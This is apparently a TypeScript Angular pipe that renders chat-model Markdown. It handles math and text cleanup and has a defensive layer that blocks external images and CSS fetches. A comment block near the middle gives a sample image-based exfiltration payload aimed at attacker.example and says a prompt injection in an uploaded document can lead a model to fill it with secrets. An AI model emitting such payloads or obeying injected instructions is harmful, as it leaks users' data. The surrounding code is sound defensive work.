import { ChangeDetectorRef, OnDestroy, Pipe, PipeTransform } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import { marked, MarkedExtension } from 'marked';
import type { KatexOptions } from 'katex';
import DOMPurify from 'dompurify';
import { KatexLoaderService, type Katex } from '../services/katex-loader.service';

// Set by MarkdownPipe.transform around marked.parse, inside which the renderers run synchronously.
let activeKatex: Katex | null = null;
let mathPending = false;
let activeQuoteCopy: { nonce: string; sources: string[] } | null = null;
let quoteDepth = 0;

/** The optional rendering feature `MarkdownPipe` takes as its argument. */
export type MarkdownFeature = 'quote-copy' | null;

/** A blockquote's Markdown source with its own `>` markers removed; nested markers are kept. */
function quoteMarkdown(raw: string): string {
  return raw.replace(/\r\n/g, '\n').replace(/^ {0,3}>[ \t]?/gm, '').trim();
}

/** The TeX source, shown until KaTeX has loaded. */
function mathPlaceholder(raw: string, display: boolean): string {
  mathPending = true;
  const cls = display ? 'math-pending math-pending-display' : 'math-pending';
  return `<span class="${cls}">${escapeHtml(raw.trim())}</span>`;
}

function createKatexExtension(options: KatexOptions = {}): MarkedExtension {
  const katexOptions: KatexOptions = {
    throwOnError: false,
    ...options
  };

  const inlineDollarRegex = /^\$(?!\s|\$)((?:\\.|[^\$\n])+?)(?<!\s|\\)\$(?!\d)/;

  return {
    extensions: [
      {
        name: 'blockMath',
        level: 'block',
        tokenizer(src: string) {
          if (src.startsWith('$$')) {
            const match = src.match(/^\$\$([\s\S]+?)\$\$[ \t]*(?:\n+|$)/);
            if (match) {
              return {
                type: 'blockMath',
                raw: match[0],
                text: match[1].trim(),
                displayMode: true
              };
            }
          }
          if (src.startsWith('\\[')) {
            const match = src.match(/^\\\[([\s\S]+?)\\\][ \t]*(?:\n+|$)/);
            if (match) {
              return {
                type: 'blockMath',
                raw: match[0],
                text: match[1].trim(),
                displayMode: true
              };
            }
          }
          if (src.startsWith('\\begin{')) {
            const match = src.match(/^(\\begin\{([a-zA-Z0-9*]+)\}[\s\S]+?\\end\{\2\})[ \t]*(?:\n+|$)/);
            if (match) {
              return {
                type: 'blockMath',
                raw: match[0],
                text: match[1].trim(),
                displayMode: true
              };
            }
          }
          return undefined;
        },
        renderer(token: any) {
          if (!activeKatex) {
            return mathPlaceholder(token.raw, true) + '\n';
          }
          try {
            return activeKatex.renderToString(token.text, { ...katexOptions, displayMode: true }) + '\n';
          } catch {
            return `<pre class="katex-error">${token.text}</pre>\n`;
          }
        }
      },
      {
        name: 'inlineMath',
        level: 'inline',
        start(src: string) {
          const match = src.match(/\\\(|\\\[|\$\$|\$|\\begin\{/);
          return match ? match.index : -1;
        },
        tokenizer(src: string) {
          if (src.startsWith('\\(')) {
            const match = src.match(/^\\\(([\s\S]+?)\\\)/);
            if (match) {
              return {
                type: 'inlineMath',
                raw: match[0],
                text: match[1].trim(),
                displayMode: false
              };
            }
          }
          if (src.startsWith('\\[')) {
            const match = src.match(/^\\\[([\s\S]+?)\\\]/);
            if (match) {
              return {
                type: 'inlineMath',
                raw: match[0],
                text: match[1].trim(),
                displayMode: true
              };
            }
          }
          if (src.startsWith('$$')) {
            const match = src.match(/^\$\$([\s\S]+?)\$\$/);
            if (match) {
              return {
                type: 'inlineMath',
                raw: match[0],
                text: match[1].trim(),
                displayMode: true
              };
            }
          }
          if (src.startsWith('\\begin{')) {
            const match = src.match(/^(\\begin\{([a-zA-Z0-9*]+)\}[\s\S]+?\\end\{\2\})/);
            if (match) {
              return {
                type: 'inlineMath',
                raw: match[0],
                text: match[1].trim(),
                displayMode: true
              };
            }
          }
          if (src.startsWith('$') && !src.startsWith('$$')) {
            const match = src.match(inlineDollarRegex);
            if (match) {
              const inner = match[1];
              // Guard against standalone currency numbers e.g. $50, $100.00
              if (!/^\d+(?:[.,]\d+)?$/.test(inner.trim())) {
                return {
                  type: 'inlineMath',
                  raw: match[0],
                  text: inner.trim(),
                  displayMode: false
                };
              }
            }
          }
          return undefined;
        },
        renderer(token: any) {
          if (!activeKatex) {
            return mathPlaceholder(token.raw, token.displayMode ?? false);
          }
          try {
            return activeKatex.renderToString(token.text, { ...katexOptions, displayMode: token.displayMode ?? false });
          } catch {
            return token.raw;
          }
        }
      }
    ]
  };
}

// Register KaTeX extension once at module load
marked.use(createKatexExtension());

/**
 * "word.Next" glued together by the model. The character before the stop is never whitespace,
 * Markdown markup, an opening bracket, a capital (ASP.NET), a slash, a backslash or a quote
 * (WinUI/.NET, ".NET"); the capital after it never starts NET followed by a non-letter (.NET).
 */
const SQUISHED_SENTENCE_REGEX = /([^\s*_`(\[{<A-Z\/\\'"][.!?])(?!NET(?![A-Za-z]))([A-Z])/g;

/* ─────────────────────────────────────────────────────────────────────────────
   External-image defang.

   Rendered model output is HTML, and DOMPurify's html profile permits <img src>
   to any origin. So `![](https://attacker.example/leak?q=secret)` in a reply is a
   live exfiltration channel: the browser fetches it on render and the query string
   carries whatever the model was induced to put there — which, after a prompt
   injection inside an uploaded document, can be anything the model has seen.

   Three layers, innermost first:
     1. the marked image renderer below, which turns an external image into a
        visible blocked badge, so the user is told rather than left with a broken
        image;
     2. the DOMPurify hooks, which catch an <img> or a background-image that
        arrives as raw HTML in the model's output and so never passes through the
        renderer;
     3. the Content-Security-Policy's `img-src 'self' data:` from Stage A, which is
        the backstop and the only layer that cannot be reasoned around.

   Layer 3 alone would block the request silently. This file exists for the part a
   header cannot do: saying what was blocked.
   ───────────────────────────────────────────────────────────────────────────── */

/** Whether a URL loads from this origin (or carries its own bytes) rather than reaching out. */
function isLocalImageSource(href: string): boolean {
  const url = (href || '').trim();
  if (!url) return false;

  // Its own bytes: no request leaves the browser, and the CSP allows data:.
  if (/^data:image\//i.test(url)) return true;

  // Protocol-relative (//host/path) is external however the page is served.
  if (url.startsWith('//')) return false;

  // Root-relative, or a fragment or query against the current document.
  if (url.startsWith('/') || url.startsWith('#') || url.startsWith('?')) return true;

  /* Anything with a scheme is external unless it resolves to this very origin.
     javascript: and vbscript: land here too and are refused, though DOMPurify would
     also strip them. */
  if (/^[a-z][a-z0-9+.-]*:/i.test(url)) {
    try {
      return new URL(url).origin === window.location.origin;
    } catch {
      return false;
    }
  }

  // A bare relative path.
  return true;
}

/**
 * Whether a link leaves this site: an http(s) URL, absolute or protocol-relative, whose origin
 * differs from this one. Relative, root-relative, fragment and mailto: links are not.
 */
function isExternalWebLink(href: string): boolean {
  const url = (href || '').trim();
  if (!url) return false;
  if (!url.startsWith('//') && !/^[a-z][a-z0-9+.-]*:/i.test(url)) return false;

  try {
    const resolved = new URL(url, window.location.href);
    return (resolved.protocol === 'http:' || resolved.protocol === 'https:') &&
      resolved.origin !== window.location.origin;
  } catch {
    return false;
  }
}

/** The badge shown in place of a blocked image. */
function blockedImageBadge(href: string, alt: string): string {
  const label = alt && alt.trim().length > 0 ? alt.trim() : 'external image';
  return '<span class="blocked-external-image" title="' + escapeHtmlAttribute(href) +
    '">🚫 External image blocked: ' + escapeHtml(label) + '</span>';
}

function escapeHtml(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function escapeHtmlAttribute(value: string): string {
  return escapeHtml(value).replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

/**
 * True when a CSS declaration block can fetch a resource.
 *
 * Checked after CSS comments are removed and `\XX` escapes are decoded, because
 * `url(...)` can be spelled `\75 rl(...)` or `ur/**\/l(...)` and still work.
 */
function styleCanFetch(style: string): boolean {
  let value = (style || '').replace(/\/\*[\s\S]*?\*\//g, '');

  // Decode CSS escapes: \75 , \0075, \u -> the character itself.
  value = value.replace(/\\([0-9a-fA-F]{1,6})\s?/g, (_m, hex) => {
    const code = parseInt(hex, 16);
    return Number.isFinite(code) && code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : '';
  });
  value = value.replace(/\\(.)/g, '$1');

  return /url\s*\(|image-set\s*\(|element\s*\(/i.test(value);
}

export const MARKDOWN_IMAGE_DEFANG_HOOKS_INSTALLED = installDefangHooks();

function installDefangHooks(): boolean {
  /* Renderer override. `marked.use` merges renderers, so this composes with the KaTeX
     extension registered above rather than replacing it. */
  marked.use({
    renderer: {
      image(token: any): string {
        const href: string = (token && token.href) || '';
        const alt: string = (token && token.text) || '';
        const title: string = (token && token.title) || '';

        if (!isLocalImageSource(href)) {
          return blockedImageBadge(href, alt);
        }

        const titleAttr = title ? ' title="' + escapeHtmlAttribute(title) + '"' : '';
        return '<img src="' + escapeHtmlAttribute(href) + '" alt="' + escapeHtmlAttribute(alt) + '"' + titleAttr + '>';
      },

      /* The markup matches marked's own blockquote renderer. With the quote-copy feature on, a
         top-level quote also carries a nonce-tagged index into the recorded Markdown sources. */
      blockquote(this: any, token: any): string {
        const outer = quoteDepth === 0;
        quoteDepth++;
        let body: string;
        try {
          body = this.parser.parse(token.tokens);
        } finally {
          quoteDepth--;
        }
        if (!activeQuoteCopy || !outer) return `<blockquote>\n${body}</blockquote>\n`;
        const n = activeQuoteCopy.sources.push(quoteMarkdown(token.raw ?? '')) - 1;
        return `<blockquote data-md-quote="${activeQuoteCopy.nonce}-${n}">\n${body}</blockquote>\n`;
      }
    }
  });

  /* Hooks are global to the DOMPurify instance and are installed once at module load.
     They cover the routes the renderer never sees: raw <img> in the model's HTML output,
     srcset, the source/track family, and background-image in a style attribute. */
  DOMPurify.addHook('uponSanitizeElement', (node: any, data: any) => {
    if (data.tagName !== 'img' && data.tagName !== 'source' && data.tagName !== 'image') {
      return;
    }

    const src: string = (node.getAttribute && node.getAttribute('src')) || '';
    const srcset: string = (node.getAttribute && node.getAttribute('srcset')) || '';

    const srcsetIsExternal = srcset
      .split(',')
      .map(candidate => candidate.trim().split(/\s+/)[0])
      .filter(candidate => candidate.length > 0)
      .some(candidate => !isLocalImageSource(candidate));

    if ((src && !isLocalImageSource(src)) || srcsetIsExternal) {
      /* Replaced rather than merely stripped of its src, so nothing is left behind that a
         later stylesheet or attribute could point at a remote origin again. */
      const replacement = node.ownerDocument.createElement('span');
      replacement.setAttribute('class', 'blocked-external-image');
      replacement.setAttribute('title', src || srcset);
      replacement.textContent = '🚫 External image blocked';
      node.parentNode?.replaceChild(replacement, node);
    }
  });

  DOMPurify.addHook('uponSanitizeAttribute', (_node: any, data: any) => {
    /* `style` is on the ADD_ATTR allowlist because KaTeX's output depends on inline styles
       for its glyph metrics — removing it would break every rendered formula. So the value is
       filtered instead: a declaration that can fetch a resource takes the whole attribute
       with it, since a partial repair of CSS is not something to attempt by regex. */
    if (data.attrName === 'style' && styleCanFetch(data.attrValue)) {
      data.keepAttr = false;
    }
  });

  /* An external link opens in a new tab, so following it never unloads the chat. It runs after
     attribute sanitization, so `target` needs no ADD_ATTR entry and a model-supplied target or
     rel is overwritten. */
  DOMPurify.addHook('afterSanitizeAttributes', (node: any) => {
    if (node.nodeName !== 'A' || !isExternalWebLink(node.getAttribute('href'))) {
      return;
    }

    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  });

  return true;
}

const SVG_NS = 'http://www.w3.org/2000/svg';

function svgIcon(doc: Document, className: string, shapes: [string, Record<string, string>][]): SVGSVGElement {
  const svg = doc.createElementNS(SVG_NS, 'svg');
  const attrs: Record<string, string> = {
    class: className, 'aria-hidden': 'true', width: '16', height: '16', viewBox: '0 0 24 24', fill: 'none',
    stroke: 'currentColor', 'stroke-width': '2', 'stroke-linecap': 'round', 'stroke-linejoin': 'round'
  };
  for (const [name, value] of Object.entries(attrs)) svg.setAttribute(name, value);
  for (const [tag, shapeAttrs] of shapes) {
    const shape = doc.createElementNS(SVG_NS, tag);
    for (const [name, value] of Object.entries(shapeAttrs)) shape.setAttribute(name, value);
    svg.appendChild(shape);
  }
  return svg;
}

/**
 * Inserts a copy button into every nonce-tagged top-level blockquote of sanitized HTML.
 *
 * Anti-forgery invariant: the controls exist only after sanitization and are built here with DOM
 * APIs. Anything resembling one that sanitization let through (a model-written control, a
 * data-md-quote-text attribute, a data-md-quote without this render's nonce) is removed first, so
 * a button always copies the Markdown of the quote it sits in.
 */
function addQuoteCopyButtons(html: string, nonce: string, sources: string[]): string {
  const template = document.createElement('template');
  template.innerHTML = html;
  const root = template.content;
  const doc = template.ownerDocument;

  root.querySelectorAll('[class*="md-quote-copy"]').forEach(el => el.remove());
  root.querySelectorAll('[data-md-quote-text]').forEach(el => el.removeAttribute('data-md-quote-text'));

  const prefix = `${nonce}-`;
  root.querySelectorAll('blockquote[data-md-quote]').forEach(quote => {
    const tag = quote.getAttribute('data-md-quote') ?? '';
    quote.removeAttribute('data-md-quote');
    if (!tag.startsWith(prefix)) return;
    const index = tag.slice(prefix.length);
    if (!/^\d+$/.test(index)) return;
    const n = Number(index);
    if (n >= sources.length) return;

    const id = `tip-md-quote-${nonce}-${n}`;
    const label = sources.length === 1 ? 'Copy quote as Markdown' : `Copy quote ${n + 1} as Markdown`;

    const group = doc.createElement('span');
    group.className = 'md-quote-copy';

    const button = doc.createElement('button');
    button.setAttribute('type', 'button');
    button.className = 'action-btn md-quote-copy-btn';
    button.setAttribute('aria-label', label);
    button.setAttribute('data-md-quote-text', sources[n]);
    button.setAttribute('interestfor', id);
    button.setAttribute('style', `anchor-name: --${id}`);
    button.appendChild(svgIcon(doc, 'md-quote-icon-copy', [
      ['rect', { x: '9', y: '9', width: '13', height: '13', rx: '2', ry: '2' }],
      ['path', { d: 'M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1' }]
    ]));
    button.appendChild(svgIcon(doc, 'md-quote-icon-copied', [
      ['polyline', { points: '20 6 9 17 4 12' }]
    ]));

    const status = doc.createElement('span');
    status.className = 'md-quote-copy-status';
    status.setAttribute('role', 'status');

    group.append(button, status);

    const tip = doc.createElement('div');
    tip.setAttribute('popover', 'hint');
    tip.className = 'gh-tooltip md-quote-copy-tip';
    tip.id = id;
    tip.setAttribute('style', `position-anchor: --${id}`);
    tip.textContent = label;

    quote.classList.add('md-quote-copyable');
    quote.prepend(group, tip);
  });

  return template.innerHTML;
}

@Pipe({
  name: 'markdown',
  standalone: true,
  pure: false
})
export class MarkdownPipe implements PipeTransform, OnDestroy {
  private lastValue: string | undefined;
  private lastKatexReady = false;
  private lastFeature: MarkdownFeature = null;
  private lastResult: SafeHtml | string = '';
  private awaitingKatex = false;
  private destroyed = false;

  // ChangeDetectorRef is optional so a spec can construct the pipe outside a template.
  constructor(private sanitizer: DomSanitizer, private katexLoader: KatexLoaderService, private cdr?: ChangeDetectorRef) {}

  transform(value: string, feature: MarkdownFeature = null): SafeHtml | string {
    // Impure: an unchanged input with unchanged KaTeX readiness and feature returns the previous result.
    const ready = this.katexLoader.get() !== null;
    if (value === this.lastValue && ready === this.lastKatexReady && feature === this.lastFeature) {
      return this.lastResult;
    }

    const result = this.render(value, feature);

    if (mathPending && !this.awaitingKatex) {
      this.awaitingKatex = true;
      this.katexLoader.load().then(k => {
        if (k && !this.destroyed) this.cdr?.markForCheck();
      });
    }

    this.lastValue = value;
    this.lastKatexReady = ready;
    this.lastFeature = feature;
    this.lastResult = result;
    return result;
  }

  ngOnDestroy(): void {
    this.destroyed = true;
  }

  private render(value: string, feature: MarkdownFeature): SafeHtml | string {
    mathPending = false;
    if (!value) return '';
    // Split the string into code blocks/inline code/math blocks and normal text
    // This ensures we don't accidentally modify code snippets or math expressions
    const protectRegex = /(```[\s\S]*?```|`[^`]*`|\$\$[\s\S]*?\$\$|\\\[[\s\S]*?\\\]|\\\([\s\S]*?\\\)|\\begin\{[a-zA-Z0-9*]+\}[\s\S]+?\\end\{[a-zA-Z0-9*]+\})/g;
    const parts = value.split(protectRegex);

    for (let i = 0; i < parts.length; i++) {
      // Even indices are normal text, odd indices are protected code blocks/math
      if (i % 2 === 0) {
        const lines = parts[i].split('\n');

        for (let j = 0; j < lines.length; j++) {
          let line = lines[j];

          if (line.includes('|')) {
            // Table row or line with pipe. Do NOT inject double newlines (\n\n) as that terminates table parsing.
            // Fix squished sentences using a space instead of double newlines
            line = line.replace(SQUISHED_SENTENCE_REGEX, '$1 $2');
          } else {
            // Normal non-table line

            // Fix missing newlines before headings (e.g. LLM outputs "TEXT#### HEADING")
            // Only apply if the # is preceded by a non-newline, non-hash character and followed by a space;
            // a line that already starts with its heading marker is left alone
            line = line.replace(/([^\n#])(#{1,6}\s+)/g, (match, p1, p2, offset, str) => {
              if (p2.trim() === '#') {
                // Prevent replacing C#, F# by checking if it's a standalone letter before #
                if (/[a-zA-Z]/.test(p1)) {
                  const prevChar = offset > 0 ? str[offset - 1] : ' ';
                  if (!/[a-zA-Z]/.test(prevChar)) {
                    return match;
                  }
                }
                // Prevent replacing " # " (e.g., "Issue # 1")
                if (p1 === ' ') {
                  return match;
                }
              }
              return `${p1}\n\n${p2}`;
            });

            // Fix missing newlines before lists following a colon (e.g. "text):1. Item")
            // Requires list numbers 1+ followed by text content (not values like "0. ")
            line = line.replace(/([a-zA-Z0-9\)]):\s*([1-9]\d*\.\s+[A-Za-z\*\`\_])/g, '$1:\n\n$2');

            // Fix squished sentences (e.g., LLM outputs "word.Next word" without a space)
            // Matches any non-whitespace (excluding markdown formatting characters *, _, `, opening brackets (, [, {, <, and uppercase letters A-Z), a punctuation mark (., !, ?), and a capital letter
            // This prevents splitting terms like "**.NET", "(.NET", "WinUI/.NET", or "ASP.NET" into "**.\n\nNET"
            line = line.replace(SQUISHED_SENTENCE_REGEX, '$1\n\n$2');
          }

          lines[j] = line;
        }

        parts[i] = lines.join('\n');

        // Fix missing newlines before code blocks and display math blocks (e.g. LLM outputs "text.\\[")
        if (i + 1 < parts.length && parts[i].length > 0) {
          const nextIsBlock = parts[i + 1].startsWith('```') || 
                              parts[i + 1].startsWith('\\[') || 
                              parts[i + 1].startsWith('$$') || 
                              parts[i + 1].startsWith('\\begin{');
          if (nextIsBlock) {
            parts[i] = parts[i].replace(/\n*$/, '\n\n');
          }
        }

        // Fix missing newlines after code blocks and display math blocks (e.g. LLM outputs "\\]text")
        if (i > 0 && parts[i].length > 0) {
          const prevIsBlock = parts[i - 1].startsWith('```') || 
                              parts[i - 1].startsWith('\\[') || 
                              parts[i - 1].startsWith('$$') || 
                              parts[i - 1].startsWith('\\begin{');
          if (prevIsBlock) {
            parts[i] = parts[i].replace(/^\n*/, '\n\n');
          }
        }
      }
    }
    
    let processed = parts.join('');

    activeKatex = this.katexLoader.get();
    const quoteCopy = feature === 'quote-copy' ? { nonce: crypto.randomUUID(), sources: [] as string[] } : null;
    activeQuoteCopy = quoteCopy;
    quoteDepth = 0;
    let parsed: string | Promise<string>;
    try {
      parsed = marked.parse(processed);
    } finally {
      activeKatex = null;
      activeQuoteCopy = null;
      quoteDepth = 0;
    }
    // marked.parse can return a Promise if async options are used, but by default it returns a string
    const html = typeof parsed === 'string' ? parsed : '';
    
    const purified = DOMPurify.sanitize(html, {
      USE_PROFILES: { mathMl: true, html: true },
      ADD_TAGS: ['annotation', 'semantics'],
      ADD_ATTR: ['encoding', 'class', 'style', 'aria-hidden', 'tabindex']
    });

    const output = quoteCopy &&
      (quoteCopy.sources.length > 0 || purified.includes('md-quote-copy') || purified.includes('data-md-quote'))
      ? addQuoteCopyButtons(purified, quoteCopy.nonce, quoteCopy.sources)
      : purified;

    return this.sanitizer.bypassSecurityTrustHtml(output);
  }
}
